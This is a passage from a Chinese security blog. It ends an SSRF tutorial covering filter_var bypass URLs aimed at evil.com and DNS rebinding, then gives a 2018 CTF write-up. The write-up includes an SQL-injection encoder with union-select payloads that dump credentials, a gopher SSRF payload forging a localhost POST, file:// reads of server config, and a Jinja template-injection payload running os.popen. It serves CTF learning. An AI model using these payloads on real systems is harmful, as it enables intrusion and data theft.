[<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;u&quot;</span></span><br><span class="line">  [<span class="string">&quot;pass&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;p@127.0.0.1:80&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/flag.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细可以看看<a href="http://v0w.top/2019/02/10/Hgame2019-week2WP/#php-trick">我的WP</a></p><h2 id="3-trick1-filter-var-bypass"><a href="#3-trick1-filter-var-bypass" class="headerlink" title="3. trick1 filter_var() bypass"></a>3. trick1 filter_var() bypass</h2><p>看到很多大佬的文章都有提到，找到<a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">原文链接</a></p><p><strong>示例代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Argument: &quot;</span>.$url.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span>(filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      $r = parse_url($url);</span><br><span class="line">      var_dump($r);</span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/google\.com$/&#x27;</span>, $r[<span class="string">&#x27;host&#x27;</span>])) </span><br><span class="line">      &#123;</span><br><span class="line">         exec(<span class="string">&#x27;curl -v -s &quot;&#x27;</span>.$r[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, $a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Error: Host not allowed&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Error: Invalid URL&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mixed filter_var ( mixed $variable [, int $filter &#x3D; FILTER_DEFAULT [, mixed $options ]] )函数有两种参数。</span><br><span class="line">FILTER_VALIDATE_EMAIL 检查是否为有效邮箱</span><br><span class="line">FILTER_VALIDATE_URL 检查是否为有效url</span><br></pre></td></tr></table></figure><p>代码的逻辑是先判断，url是否符合逻辑，符合则用<code>preg_match</code>来匹配，匹配成功就curl</p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:80,google.com:80&#x2F;</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:23333;google.com:80&#x2F;</span><br></pre></td></tr></table></figure><p>利用，或者；可以绕过。</p><blockquote><p>许多URL方案保留某些特殊含义的字符：它们在URL的特定于方案的部分中的外观具有指定的语义。如果在方案中保留对应于八位字节的字符，则必须对八位字节进行编码。字符“;”，“/”，“？”，“：”，“@”，“=”和“＆”可以保留用于方案内的特殊含义。在方案中不能保留其他字符。</p><p>除了分层路径中的点段之外，通用语法将路径段视为不透明。URI生成应用程序通常使用段中允许的保留字符来分隔特定于方案或解除引用处理程序的子组件。例如，<strong>分号</strong>（“;”）和<strong>等于</strong>（“=”）保留字符<strong>通常用于分隔</strong>适用于该段的<strong>参数和参数值</strong>。<strong>逗号</strong>（“，”）保留字符<strong>通常用于类似目的。</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Argument: 0:&#x2F;&#x2F;evil.com:2333;google.com:80</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;scheme&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;0&quot;</span><br><span class="line">  [&quot;host&quot;]&#x3D;&gt;</span><br><span class="line">  string(30) &quot;evil.com;google.com&quot;</span><br><span class="line">  [&quot;port&quot;]&#x3D;&gt;</span><br><span class="line">  int(80)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/23/5c7134680c695.png"></p><h2 id="4-DNS重绑攻击"><a href="#4-DNS重绑攻击" class="headerlink" title="4. DNS重绑攻击"></a>4. DNS重绑攻击</h2><p>网上原理多为文字，可能不太易懂，画图形象。</p><p><img src="https://i.loli.net/2019/01/15/5c3df58ad59ce.png" alt="https://i.loli.net/2019/01/15/5c3df58ad59ce.png"></p><p>关键是利用服务端第一次去请求DNS服务和第二次进行域名解析即访问URL之间的的时间差，利用这个时间差进行DNS重绑定攻击</p><p>还有就是DNS服务器需要设置TTL=0，TTL为DNS服务器里域名和IP绑定关系的cache存活的时间</p><p>实现方法：</p><ol><li>设置TTL，0ctF2016的monkey题目就是利用DNS重绑攻击绕过，国外域名一般可以设置TTL=0</li><li>还有种方法就是设置两条A记录给域名一个解析的ip为外网，另一个解析的ip为内网，那么这就成了概率问题，一次访问有1/4的概率访问内网</li><li>直接自建DNS服务器，比如dnspython等模块</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://www.zerokeeper.com/web-security/ssrf-learning-notes.html">SSRF 学习笔记</a></li><li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/">CTFwiki-SSRF</a></li><li><a href="https://xz.aliyun.com/t/2115">了解SSRF,这一篇就足够了</a></li><li><a href="https://www.freebuf.com/articles/web/20407.html">SSRF攻击实例解析</a></li><li><a href="https://www.th1s.cn/index.php/2017/02/28/66.html">ssrf bypass总结</a></li><li><a href="http://j0k3r.top/2019/01/30/SSRF/">http://j0k3r.top/2019/01/30/SSRF/</a></li><li><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></li><li><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()">https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSRF概述&quot;&gt;&lt;a href=&quot;#SSRF概述&quot; class=&quot;headerlink&quot; title=&quot;SSRF概述&quot;&gt;&lt;/a&gt;SSRF概述&lt;/h1&gt;&lt;p&gt;SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服</summary>
      
    
    
    
    <category term="Web安全" scheme="v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SSRF" scheme="v0w.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯2018-WP</title>
    <link href="v0w.top/2018/11/18/hxb2018-WP/"/>
    <id>v0w.top/2018/11/18/hxb2018-WP/</id>
    <published>2018-11-17T16:00:00.000Z</published>
    <updated>2020-07-18T10:49:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先，这次湖湘杯的web出的真的差，多种非预期，多种环境问题，题目多次上线下线，还没有实时的分数榜？？？因为这次逆向和pwn不强，我们应该是无缘决赛了==、有点难受。。。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>签到题，进入公众号回复hxb2018即得。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image002.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;W3lc0me_T0_Hxb2o18&#125;</span><br></pre></td></tr></table></figure><h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><p>首先，进入维护通知，发现这个</p><p>/news/list.php</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image004.jpg"></p><p>进入/news</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image006.jpg"></p><p>发现zip源码泄露，下载源码：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image008.jpg"></p><p>逻辑很简单，就是把加密的id取出来，然后解密，之后SQL查询，很明显的SQL注入，然后只是加了个加密。</p><p>根据解密函数，写个加密函数，之后把SQL语句加密提交就行了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span></span><br><span class="line"><span class="comment">// require_once &#x27;../config.php&#x27;;</span></span><br><span class="line"><span class="comment">//解密过程</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">mcrypt_generic_init($td,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);</span><br><span class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">&#x27;hxb2018&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">mcrypt_generic_init($td,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);</span><br><span class="line">$data = $data.<span class="string">&#x27;hxb2018&#x27;</span>;</span><br><span class="line">$data = mcrypt_generic($td,$data);</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line">$data = base64_encode(base64_encode($data));</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,3,4#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,database(),version(),4#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrN2JhOUx4ZE82R1VhU0k0UXRITlRaS2w0dnRBV2Yva3VnWFdXa21TNWhOaA==</span></span><br><span class="line"><span class="comment"># mozhe_discuz_stormgroup</span></span><br><span class="line"><span class="comment"># 5.1.73</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrM1NpZEZ4Z2o0TktKSElob2Z3YithcmtBYStsR0VLVUVPdFZPeHE4THZLcnYxMEpjM3FjZ0QxMHpTSHBTSExobG1IeHArc3NsMzlDaDM1TlpsTUdVb2NEMnpvNDRpcUMrVzl6ZFR2L1lobG1Yd083WnJocC80ZURGNnJaVlh4c1RyUzNKQXZVdFdRODdKQ01iQmEzYnJBPQ==</span></span><br><span class="line"><span class="comment">// notice,notice2,stormgroup_member</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name=&quot;stormgroup_member&quot;#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrM1NpZEZ4Z2o0TktKSElob2Z3YithckVCelF1dUJ6S2doQ3pOR2pxOGZBSDIzOWdxYlYwayt6Nm1oRU1PZUZscWVMU3BQMGgzWTNabmdHMmQ2ZXBXWVUrOVltWmZWQWtVNWM2dFVjQm1jWEM5YmlxWGF6R0N3WE1JWG52WXVONHFMRE1iZ0kyM3BtN2Y5TktKUUZoMm9KV2RmRGV5N3RreDlFV0t0QTFjRlpUOFdiRGQ0Q2FVa3h4b2JvNUc1U0FSQT09</span></span><br><span class="line"><span class="comment">// id,name,password,status</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,name,password,4 from stormgroup_member#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// mozhe1</span></span><br><span class="line"><span class="comment">// 356f589a7df439f6f744ff19bb8092c0</span></span><br><span class="line"><span class="comment">// dsan13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name=&quot;notice2&quot;#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// id,title</span></span><br><span class="line"><span class="keyword">echo</span> encode(<span class="string">&#x27;0 union select 1,group_concat(id),group_concat(title),4 from notice2#&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrMlVPU1lyV2NyNUc5Q240TXB0UldaaEtMakFxSWwxeTZEWmdrQU1rRERVMDhldVNZa1ZRV1lZbGdDZFUySFVJR05ZSmNjRWlBRTdwb2dNUFdhVERjN3M9</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image010.jpg"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image012.jpg"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image014.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;7a2709e852f6ee9e6ead206d055cd38&#125;</span><br></pre></td></tr></table></figure><h2 id="Readflag"><a href="#Readflag" class="headerlink" title="Readflag"></a>Readflag</h2><p>提示非常明显SSRF，首先SSRF+file协议读文件，我想知道web目录，于是读apache的配置文件：</p><p><a href="http://47.107.238.167/?url=file:///etc/apache2/sites-available/000-default.conf">http://47.107.238.167/?url=file:///etc/apache2/sites-available/000-default.conf</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request&#39;s Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;ssrf&#x2F;web.php # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined # For most configuration files from conf-available&#x2F;, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with &quot;a2disconf&quot;. #Include conf-available&#x2F;serve-cgi-bin.conf # vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br></pre></td></tr></table></figure><p>得到web目录</p><p><code>/var/www/html/ssrf/web.php</code></p><p>拿到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;ssrf me with parameter &#x27;url&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="comment">//echo $_GET[&#x27;url&#x27;];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;user&#x27;</span>]==<span class="string">&quot;admin&quot;</span> &amp;&amp; $ip==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    system(<span class="string">&quot;/var/www/html/ssrf/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析逻辑，不难发现想要绕过这个判断执行程序，需要一个服务器本地代理，利用gopher协议可以做到：</p><p>paylaod：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?url&#x3D;gopher%3A%2F%2F127.0.0.1%3A80%2F_POST+%2F+HTTP%2F1.1%250d%250aHost%3A+127.0.0.1%250d%250aUser-Agent%3A+curl%2F7.43.0%250d%250aAccept%3A+%2A%2F%2A%250d%250aContent-Length%3A+10%250d%250aContent-Type%3A+application%2Fx-www-form-urlencoded%250d%250a%250d%250auser%3Dadmin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image028.jpg"></p><p>事实上，本题存在非预期解，因为flag文件直接就在web目录下，所以可以直接通过file协议去读flag文件：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image030.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;0ef0c0d15f1a33b47af2a01669fbf124&#125;</span><br></pre></td></tr></table></figure><h2 id="MyNote"><a href="#MyNote" class="headerlink" title="MyNote"></a>MyNote</h2><p>/robots.txt容易发现源码泄露</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image032.jpg"></p><p>在/User.php中发现函数__destruct()</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image034.jpg"></p><p>可能存在反序列化，又发现上传文件后，会多一个Cookie—Picture。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image036.jpg"></p><p>base64解一下，容易出来</p><p><code>a:1:&#123;i:0;s:32:&quot;F2006061314554700166_400x400.jpg&quot;;&#125;</code></p><p>发现是原文件名的序列化。</p><p>将其改为想读取的文件：flag的序列化，BASE64加密得到</p><p>把原来的文件名改为flag.php</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image038.gif"></p><p>得到新的cookie，修改cookie得到flag</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image040.jpg"></p><p>base64解码得到flag。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image042.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;445b40b69867325f6145eca1e77fc8e1&#125;</span><br></pre></td></tr></table></figure><h2 id="XmeO"><a href="#XmeO" class="headerlink" title="XmeO"></a>XmeO</h2><p>注册登录然后add的内容能进行模板注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()&#125;&#125; </span><br></pre></td></tr></table></figure><p>选项填否，然后点show得到回显</p><p>读auto.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:9990&#x2F;admin&quot;</span><br><span class="line"> setInterval(function()&#123;</span><br><span class="line"> var webPage &#x3D; require(&#39;webpage&#39;);</span><br><span class="line"> var page &#x3D; webPage.create();</span><br><span class="line"> ​</span><br><span class="line"> var setting&#x3D;&#123;</span><br><span class="line">   operation: &quot;GET&quot;,</span><br><span class="line">   encoding: &quot;utf8&quot;,</span><br><span class="line">   headers: &#123;</span><br><span class="line">​           &quot;Referer&quot;:url</span><br><span class="line">​         &#125;,</span><br><span class="line"> &#125;;</span><br><span class="line"> ​</span><br><span class="line"> page.addCookie(&#123;</span><br><span class="line">   &#39;name&#39;     : &#39;hint&#39;,</span><br><span class="line">   &#39;value&#39;   : &#39;Try to get admin\&#39;s page content&#39;,</span><br><span class="line">   &#39;domain&#39;   : &#39;127.0.0.1&#39;,</span><br><span class="line">   &#39;path&#39;     : &#39;&#x2F;admin&#x2F;&#39;,</span><br><span class="line">   &#39;httponly&#39; : false,</span><br><span class="line">   &#39;secure&#39;   : false,</span><br><span class="line">   &#39;expires&#39; : (new Date()).getTime() + (1000 * 60 * 60)</span><br><span class="line"> &#125;);</span><br><span class="line"> ​</span><br><span class="line"> page.addCookie(&#123;</span><br><span class="line">   &#39;name&#39;     : &#39;flag&#39;,</span><br><span class="line">   &#39;value&#39;   : &#39;hxb2018&#123;29ffadfd3c22c8928f544c0b576e100f&#125;&#39;,</span><br><span class="line">   &#39;domain&#39;   : &#39;127.0.0.1&#39;,</span><br><span class="line">   &#39;path&#39;     : &#39;&#x2F;admin&#x2F;mysecrecy_directory&#39;,</span><br><span class="line">   &#39;httponly&#39; : false,</span><br><span class="line">   &#39;secure&#39;   : false,</span><br><span class="line">   &#39;expires&#39; : (new Date()).getTime() + (1000 * 60 * 60)</span><br><span class="line"> &#125;);</span><br><span class="line"> page.addCookie(&#123;</span><br><span class="line">   &#39;name&#39;     : &#39;session&#39;,</span><br><span class="line">   &#39;value&#39;   : &#39;eyJjc3JmX3Rva2VuIjp7IiBiIjoiWlRZNE0yUXlNR1pqTkRJNU16RXpOalJqWkRNMk4yUmxZVGd4TXpFelpHTmpabVEwWVRSak1RPT0ifSwidXNlcm5hbWUiOiJhZG1pbiJ9.DoVbkw.ylHkvfjRjM42G1I0gkcTQz4Hi5U&#39;,</span><br><span class="line">   &#39;domain&#39;   : &#39;127.0.0.1&#39;,</span><br><span class="line">   &#39;path&#39;     : &#39;&#x2F;admin&#x2F;&#39;,</span><br><span class="line">   &#39;httponly&#39; : true,</span><br><span class="line">   &#39;secure&#39;   : false,</span><br><span class="line">   &#39;expires&#39; : (new Date()).getTime() + (1000 * 60 * 60)</span><br><span class="line"> &#125;);</span><br><span class="line"> ​</span><br><span class="line"> page.open(url,setting,function(status)&#123;</span><br><span class="line">   console.log(page.content);</span><br><span class="line">   setTimeout(function()&#123;&#125;,7000);</span><br><span class="line"> &#125;);</span><br><span class="line"> ​</span><br><span class="line"> &#125;,7000);</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>在page.addCookie中看到了flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;29ffadfd3c22c8928f544c0b576e100f&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>挂载vmdk文件，得到四个txt文件，NTFS交换数据流隐写，拼接得到的二进制</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image044.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01100110 01101100 01100001 01100111 01111011 00110100 01000100 01010011 01011111 00110001 01101110 01011111 01000100 00110001 01110011 01101011 01111101 </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: flag&#123;4DS_1n_D1sk&#125;</span><br></pre></td></tr></table></figure><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><p>首先下载的是无线流量包，一般思路是解wifi密码，然后那这个做密钥来解流量报文。</p><p>利用kali的工具aircrack-ng，加上字典，容易破解得到密码password1</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image048.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aircrack-ng ctf.pcap  -w 33889.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image050.jpg"></p><p>之后利用这个密码来解流量数据包，命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airdecap-ng.exe ctf.pcap -e ctf -p password1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image052.jpg"></p><p>之后wireshark分析得到的流量包：追踪一个http流，容易发现flag</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image054.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: flag&#123;H4lf_1s_3n0ugh&#125;</span><br></pre></td></tr></table></figure><h2 id="Hidden-Write"><a href="#Hidden-Write" class="headerlink" title="Hidden Write"></a>Hidden Write</h2><p>搜索png的文件格式尾16进制49454E44AE</p><p>得到3个结果：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image056.jpg"></p><p>说明有三张png图片，分别提取出来，之后在一张稍大点的png中，发现LSB隐写。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image058.jpg"></p><p>得到一半flag</p><p><code>hxb2018&#123;1e30f3b836d78d25c</code></p><p>双图或多图，容易想到盲水印攻击，于是利用脚本，发现成功</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image062.jpg"></p><p>得到另一半flag</p><p><code>20b4a&#125;</code></p><p>于是得到完整的flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;1e30f3b836d78d25c20b4a&#125;</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h2><p>IDA打开程序后几乎没什么东西，查壳发现常见的upx壳。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image016.jpg"></p><p>直接用upx脱壳机脱掉，提示有重定向，而且不能运行，但是不影响静态调试。放到IDA里查看。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image018.jpg"></p><p>逻辑不复杂，只有一个加密函数,sub_401090。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image020.jpg"></p><p>发现byte_402151[]和byte_402150[]指的是同一个字符串。在hexView里提取出来，前面两位0x32和0x61也要加上（根据后面长度判断）。</p><p>而这个byte_4021A0数组，通过IDA的findcrypt插件可以发现这其实是AES加密中的S盒，为了方便直接从AES加密里把这个数组拿出来即可。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image022.jpg"></p><p>最后按照处理过程编写脚本，基本就是照着逻辑照抄，爆破即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">box &#x3D; [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,</span><br><span class="line"></span><br><span class="line">                               0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,</span><br><span class="line"></span><br><span class="line">                               0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 